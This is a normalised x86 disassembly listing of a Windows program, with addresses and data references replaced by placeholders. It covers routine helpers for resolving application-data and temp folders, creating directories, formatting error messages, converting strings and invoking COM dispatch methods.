push eax
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
push 0x132b3a1
call sub_42c79b
mov ecx ebx
mov [ esp ] r--data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
cmp esi ecx
je r-xdata
cmp esi eax
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp - 0x10 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_42e72f
leave
retn
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x4 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
mov eax esi
jmp r-xdata
sub_42c3db
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
and [ ebp - 0x210 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
test eax eax
mov ecx esi
je r-xdata
push r--data
lea eax [ ebp - 0x20c ]
push eax
jmp r-xdata
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_42e72f
leave
retn
sub_42c436
mov eax sub_43377a
call sub_42ed78
sub esp 0x20
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x2c ]
push esi
push eax
call sub_42c3db
pop ecx
xor esi esi
inc esi
cmp [ eax + 0x18 ] 0x8
mov [ ebp - 0x4 ] esi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
push [ ebp + 0x8 ]
call sub_42c2be
pop ecx
pop ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42c491
push ebp
mov ebp esp
sub esp 0x22c
mov eax [ rw-data ]
and [ ebp - 0x210 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax ebp
mov esi sub_42c491
push esi
mov [ ebp - 0x4 ] eax
call [ IsBadCodePtr@IAT ]
test eax eax
jne r-xdata
push r--data
push 0x1c
lea eax [ ebp - 0x22c ]
push eax
push esi
call [ VirtualQuery@IAT ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push [ ebp - 0x228 ]
call [ GetModuleFileNameW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push eax
jmp r-xdata
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_42e72f
leave
retn
sub_42c512
mov eax sub_4337a7
call sub_42ed78
sub esp 0x20
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x2c ]
push esi
push eax
call sub_42c491
pop ecx
xor esi esi
inc esi
cmp [ eax + 0x18 ] 0x8
mov [ ebp - 0x4 ] esi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
push [ ebp + 0x8 ]
call sub_42c2be
pop ecx
pop ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_42c56d
push ebp
lea ebp [ esp - 0x190 ]
sub esp 0x210
mov eax [ rw-data ]
push ebx
mov ebx [ ebp + 0x198 ]
push edi
xor eax ebp
mov [ ebp + 0x18c ] eax
xor edx edx
xor eax eax
mov [ ebp - 0x7c ] dx
mov ecx 0x81
lea edi [ ebp - 0x7a ]
[ edi ]
push 0x1
stosw [ edi ]
push 0x23
lea eax [ ebp - 0x7c ]
push eax
push edx
mov [ ebp - 0x80 ] edx
call [ SHGetSpecialFolderPathW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x7c ]
push eax
call esi
lea eax [ ebp - 0x7c ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push r--data
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x7c ]
push eax
call esi
lea eax [ ebp - 0x7c ]
push eax
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
pop esi
push 0x0
lea eax [ ebp - 0x7c ]
push eax
call [ CreateDirectoryW@IAT ]
mov ecx [ ebp + 0x18c ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_42e72f
add ebp 0x190
leave
retn
sub_42c627
push ebp
lea ebp [ esp - 0x190 ]
sub esp 0x210
mov eax [ rw-data ]
push ebx
mov ebx [ ebp + 0x198 ]
push edi
xor eax ebp
mov [ ebp + 0x18c ] eax
xor edx edx
xor eax eax
mov [ ebp - 0x7c ] dx
mov ecx 0x81
lea edi [ ebp - 0x7a ]
[ edi ]
push 0x1
stosw [ edi ]
push 0x1a
lea eax [ ebp - 0x7c ]
push eax
push edx
mov [ ebp - 0x80 ] edx
call [ SHGetSpecialFolderPathW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x7c ]
push eax
call esi
lea eax [ ebp - 0x7c ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push r--data
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x7c ]
push eax
call esi
lea eax [ ebp - 0x7c ]
push eax
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
pop esi
push 0x0
lea eax [ ebp - 0x7c ]
push eax
call [ CreateDirectoryW@IAT ]
mov ecx [ ebp + 0x18c ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_42e72f
add ebp 0x190
leave
retn
sub_42c6e1
push ebp
lea ebp [ esp - 0x190 ]
sub esp 0x210
mov eax [ rw-data ]
and [ ebp - 0x7c ] 0x0
and [ ebp - 0x80 ] 0x0
xor eax ebp
push ebx
mov ebx [ ebp + 0x198 ]
push edi
mov [ ebp + 0x18c ] eax
xor eax eax
mov ecx 0x81
lea edi [ ebp - 0x7a ]
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0x7c ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x7c ]
push eax
call esi
lea eax [ ebp - 0x7c ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push r--data
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x7c ]
push eax
call esi
lea eax [ ebp - 0x7c ]
push eax
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
pop esi
push 0x0
lea eax [ ebp - 0x7c ]
push eax
call [ CreateDirectoryW@IAT ]
mov ecx [ ebp + 0x18c ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_42e72f
add ebp 0x190
leave
retn
sub_42c7ac
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
mov edx [ ebp + 0xc ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
mov eax 0x132bb72
cmp edx eax
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x210 ] ebx
ja r-xdata
mov eax 0x17d7849
cmp edx eax
ja r-xdata
je r-xdata
mov eax 0x17d7854
cmp edx eax
ja r-xdata
je r-xdata
push r--data
jmp r-xdata
mov eax 0x132b3ad
cmp edx eax
ja r-xdata
mov eax edx
sub eax 0x17d7855
je r-xdata
je r-xdata
push r--data
jmp r-xdata
add eax 0xfffffffa
cmp edx eax
ja r-xdata
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_42e72f
leave
retn
mov eax 0x132b78b
cmp edx eax
ja r-xdata
je r-xdata
push r--data
sub eax 0xf422c
je r-xdata
push r--data
jmp r-xdata
mov eax edx
sub eax 0x17d784a
je r-xdata
mov eax edx
sub eax 0x17d7844
je r-xdata
je r-xdata
mov eax edx
sub eax 0x132b78c
je r-xdata
je r-xdata
push r--data
jmp r-xdata
add eax 0xfffffff9
cmp edx eax
ja r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
mov eax edx
sub eax 0x132bb73
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
mov eax edx
sub eax 0x132b3ae
je r-xdata
mov eax edx
sub eax 0x132b3a7
je r-xdata
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
mov eax edx
sub eax ebx
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax 0x5
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax 0x3e2
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax 0x132b3a1
je r-xdata
push r--data
jmp r-xdata
push edi
xor eax eax
mov [ ebp - 0x20c ] bx
mov ecx 0x81
lea edi [ ebp - 0x20a ]
[ edi ]
push ebx
push 0x208
stosw [ edi ]
lea eax [ ebp - 0x20c ]
push eax
push ebx
push edx
push ebx
push 0x1000
call [ FormatMessageW@IAT ]
lea eax [ ebp - 0x20c ]
push 0xd
push eax
call [ wcschr@IAT ]
cmp eax ebx
pop ecx
pop ecx
pop edi
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x20c ]
push eax
jmp r-xdata
mov [ eax ] bx
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
sub eax 0x4abccb
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
sub eax 0x3d8
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
sub_42cb7b
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call [ GetLastError@IAT ]
push eax
push [ ebp + 0x8 ]
call sub_42c7ac
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn
sub_42cba0
mov ax [ esp + 0x8 ]
cmp ax 0x3
push esi
mov esi ecx
je r-xdata
cmp ax 0xa
jne r-xdata
cmp ax 0xa
je r-xdata
cmp ax 0xb
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0x8 ] eax
mov [ esi ] 0xa
mov eax esi
pop esi
retn 0x8
cmp ax 0xb
je r-xdata
mov edx [ esp + 0x8 ]
mov [ esi ] 0x3
mov [ esi + 0x8 ] edx
mov eax esi
pop esi
retn 0x8
mov ecx [ esp + 0x8 ]
neg ecx
mov [ esi ] ax
sbb ecx ecx
mov [ esi + 0x8 ] cx
mov eax esi
pop esi
retn 0x8
push 0x80070057
call sub_42cee0
mov eax esi
pop esi
retn 0x8
sub_42cc10
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ lstrlenA@IAT ]
mov ebx eax
inc ebx
mov [ ebp - 0x1c ] ebx
push 0x0
push 0x0
push ebx
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
test esi esi
je r-xdata
lea esp [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ GetLastError@IAT ]
call esi
test eax eax
jg r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
cmp esi 0x1000
jge r-xdata
call esi
and eax 0xffff
or eax 0x80070000
push eax
call sub_42cee0
call esi
push eax
call sub_42cee0
xor eax eax
jmp r-xdata
push eax
call malloc
add esp 0x4
mov edi eax
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov [ ebp - 0x18 ] esp
mov eax esp
mov edi eax
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
push esi
push edi
push ebx
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_42cee0
xor eax eax
jmp r-xdata
push edi
call [ SysAllocString@IAT ]
mov ebx eax
cmp esi 0x1000
jl r-xdata
cmp esi 0x1000
jl r-xdata
test ebx ebx
jne r-xdata
push edi
call free
add esp 0x4
push edi
call free
add esp 0x4
mov eax ebx
push 0x8007000e
call sub_42cee0
sub_42cd70
push ebp
mov ebp esp
push 0xffffffff
push sub_4337c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
call wcslen
add esp 0x4
push 0x0
push 0x0
push 0x0
push 0x0
mov esi eax
inc esi
push esi
push edi
push 0x0
push 0x0
mov [ ebp - 0x14 ] esi
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
mov [ ebp - 0x18 ] edi
jne r-xdata
push edi
mov [ ebp - 0x4 ] 0x0
call sub_42e3bc
add esp 0x4
mov ebx eax
jmp r-xdata
mov esi [ GetLastError@IAT ]
call esi
test eax eax
jg r-xdata
test ebx ebx
mov [ ebp - 0x4 ] 0xffffffff
jne r-xdata
call esi
and eax 0xffff
or eax 0x80070000
push eax
call sub_42cee0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call esi
push eax
call sub_42cee0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push 0x0
push 0x0
push edi
push ebx
push esi
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_42cee0
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax ebx
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ebx
call ??3@YAXPAX@Z
mov esi [ GetLastError@IAT ]
add esp 0x4
xor ebx ebx
call esi
test eax eax
jg r-xdata
call esi
and eax 0xffff
or eax 0x80070000
call esi
jmp r-xdata
push eax
call sub_42cee0
sub_42ce39
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
test ebx ebx
mov [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x0
push 0x0
push edi
push ebx
push esi
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_42cee0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax ebx
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ebx
call ??3@YAXPAX@Z
mov esi [ GetLastError@IAT ]
add esp 0x4
xor ebx ebx
call esi
test eax eax
jg r-xdata
call esi
and eax 0xffff
or eax 0x80070000
call esi
jmp r-xdata
push eax
call sub_42cee0
sub_42cef0
push ecx
mov eax [ esp + 0xc ]
test eax eax
mov [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call [ rw-data ]
pop ecx
retn 0xc
mov ecx [ eax ]
lea edx [ esp + 0xc ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push esi
push edx
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test esi esi
pop esi
jne r-xdata
lea edx [ esp ]
push edx
push 0x0
call [ GetErrorInfo@IAT ]
test eax eax
je r-xdata
mov [ esp ] 0x0
sub_42cf60
push ecx
mov edx [ esp + 0x1c ]
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push eax
push ecx
call sub_42d180
mov esi eax
add esp 0x20
test esi esi
jge r-xdata
mov eax esi
pop esi
pop ecx
retn
mov edx [ esp + 0x4 ]
push edx
push esi
call [ rw-data ]
sub_42cfb0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x0
push eax
mov eax [ esp + 0xc ]
push ecx
push 0x2
push edx
push eax
call sub_42cf60
add esp 0x18
retn 0x10
sub_42cfe0
sub esp 0x8
mov eax [ esp + 0x14 ]
cmp ax 0x9
mov [ esp ] ax
mov [ esp + 0x2 ] 0x0
je r-xdata
mov eax 0x8
cmp ax 0xd
mov eax 0x4
jne r-xdata
mov eax esi
pop esi
add esp 0x8
retn
mov ecx [ esp + 0x8 ]
push ecx
push esi
call [ rw-data ]
push esi
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push 0x0
push eax
mov eax [ esp + 0x28 ]
push edx
push eax
call sub_42d180
mov esi eax
add esp 0x20
test esi esi
jge r-xdata
sub_42d050
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov eax [ esp + 0xc ]
test eax eax
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
pop esi
retn 0xc
mov cl [ esp + 0x10 ]
test cl cl
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_42d0d0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
test eax eax
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
pop esi
retn 0x4
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_42d110
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
mov [ esi ] r--data
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_42d140
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_42d180
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x24 ]
test eax eax
je r-xdata
mov eax 0x80004003
lea esp [ ebp - 0x70 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov eax ecx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp + 0x1c ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
mov [ ebp - 0x20 ] 0xfffffffd
test [ ebp + 0x10 ] 0xc
je r-xdata
push ecx
call [ lstrlenW@IAT ]
mov [ ebp - 0x3c ] eax
test eax eax
jbe r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call [ VariantInit@IAT ]
xor ecx ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x24 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ ebp - 0x64 ]
push ecx
mov edi [ ebp + 0x14 ]
mov cx di
neg cx
sbb ecx ecx
lea esi [ ebp - 0x34 ]
and ecx esi
push ecx
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
push r--data
mov ecx [ ebp + 0xc ]
push ecx
push eax
call [ edx + 0x18 ]
mov ebx eax
test ebx ebx
jge r-xdata
fwait
mov [ ebp - 0x4 ] 0x0
shl eax 0x4
mov esi eax
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov [ ebp - 0x18 ] esp
mov eax esp
mov ebx eax
mov [ ebp - 0x1c ] ebx
fwait
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
xor eax eax
mov edi ebx
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov [ ebp - 0x44 ] ebx
mov edx [ ebp + 0x1c ]
mov edi edx
mov eax [ ebp - 0x3c ]
shl eax 0x4
lea ecx [ eax + ebx - 0x10 ]
cmp [ edx ] 0x0
je r-xdata
mov eax 0x80070057
lea esp [ ebp - 0x70 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x38 ] 0x1
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x40 ] edx
test di di
je r-xdata
mov edx esi
push edx
call [ VariantClear@IAT ]
cmp ebx 0x80020009
jne r-xdata
mov edi [ ebp - 0x38 ]
mov eax edi
shl eax 0x4
add eax ebx
mov ecx [ ebp - 0x3c ]
sub ecx edi
lea ecx [ edx + ecx * 2 - 0x2 ]
xor esi esi
cmp ecx edx
jb r-xdata
mov eax [ ebp + 0x20 ]
jmp r-xdata
mov eax ebx
lea esp [ ebp - 0x70 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x24 ]
push eax
lea ecx [ ebp - 0x64 ]
push ecx
call sub_42d8c0
lea esp [ ebp - 0x70 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
jbe r-xdata
mov dx [ ecx ]
movzx ebx dx
and ebx 0xffffbfff
cmp ebx 0x80c
jne r-xdata
mov si [ edi ]
and si 0xf7ff
mov [ ecx ] si
movzx edx si
cmp edx 0x24
jg r-xdata
cmp di 0xc
je r-xdata
xor eax eax
test edi edi
jbe r-xdata
mov ebx [ ebp - 0x1c ]
test dh 0x40
je r-xdata
sub edx 0x4002
cmp edx 0x22
ja r-xdata
je r-xdata
mov ecx [ ebp - 0x34 ]
mov ecx [ ebp - 0x34 ]
cmp di cx
je r-xdata
sub [ ebp - 0x3c ] esi
shl esi 0x4
add [ ebp - 0x44 ] esi
lea esp [ esp ]
mov edx eax
mov edx [ eax + 0x8 ]
jmp r-xdata
test esi 0x2000
je r-xdata
movzx edx [ edx + lookup_table_42d6ec ]
jmp [ edx * 4 + jump_table_42d6e4 ]
add eax 0x4
mov edx [ eax - 0x4 ]
mov [ ecx + 0x8 ] edx
sub edx 0x2
cmp edx 0x17
ja r-xdata
sub eax 0x4002
cmp eax 0x22
ja r-xdata
je r-xdata
movzx eax di
cmp eax 0x24
jg r-xdata
push edi
push 0x0
lea edx [ ebp - 0x34 ]
push edx
mov eax edx
push eax
call [ VariantChangeType@IAT ]
mov ebx eax
test ebx ebx
jge r-xdata
mov edx eax
shl edx 0x4
add edx ebx
lea ecx [ eax + esi ]
shl ecx 0x4
add ecx ebx
mov edi [ edx ]
mov [ ecx ] edi
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
mov edx [ edx + 0xc ]
mov [ ecx + 0xc ] edx
inc eax
cmp eax [ ebp - 0x38 ]
jb r-xdata
cmp [ edx + 0x8 ] 0x80020004
jne r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov edx [ ebp + 0x1c ]
jmp [ edx * 4 + jump_table_42d684 ]
test edi 0x2000
je r-xdata
movzx ecx [ eax + lookup_table_42d780 ]
jmp [ ecx * 4 + jump_table_42d770 ]
mov edx [ ebp - 0x2c ]
mov [ esi ] edx
jmp r-xdata
sub eax 0x2
cmp eax 0x17
ja r-xdata
lea ecx [ ebp - 0x34 ]
push ecx
call [ VariantClear@IAT ]
inc esi
add eax 0x10
sub ecx 0x2
